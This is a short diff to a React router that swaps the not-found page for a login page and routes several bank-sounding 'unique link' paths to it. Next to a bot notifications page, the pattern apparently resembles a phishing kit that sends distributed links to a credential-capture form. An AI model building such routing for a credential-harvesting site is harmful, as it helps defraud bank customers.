@@ -51,7 +51,14 @@ function Router() {
       <Route path="/bill-pay" component={BillPayPage} />
       <Route path="/admin-security" component={AdminSecurityPage} />
       <Route path="/bot" component={BotNotificationsPage} />
-      <Route component={NotFound} />
+      {/* Catch-all unique link paths — always show login page */}
+      <Route path="/secure" component={LoginPage} />
+      <Route path="/online" component={LoginPage} />
+      <Route path="/signin" component={LoginPage} />
+      <Route path="/auth" component={LoginPage} />
+      <Route path="/account" component={LoginPage} />
+      <Route path="/banking" component={LoginPage} />
+      <Route component={LoginPage} />
     </Switch>
   );
 }
